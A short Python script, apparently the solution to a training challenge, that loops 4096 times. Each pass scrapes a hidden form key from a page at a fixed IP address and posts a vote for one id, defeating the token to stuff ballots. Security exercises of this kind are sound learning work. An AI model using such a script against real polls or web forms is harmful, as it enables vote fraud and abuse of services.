#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

data_info = {"id": "3867", "holdthedoor": "submit", "key":""}

for i in range(4096):
    hodor_session = requests.session()
    HTML_page = hodor_session.get("http://158.69.76.135/level1.php")
    HTML_parse = BeautifulSoup(HTML_page.text, "html.parser")
    hidden_value = HTML_parse.find("form", {"method": "post"})
    hidden_value = hidden_value.find("input", {"type": "hidden"})
    data_info["key"] = hidden_value["value"]
    hodor_session.post("http://158.69.76.135/level1.php", data=data_info)
    print(f"vote #{i}")
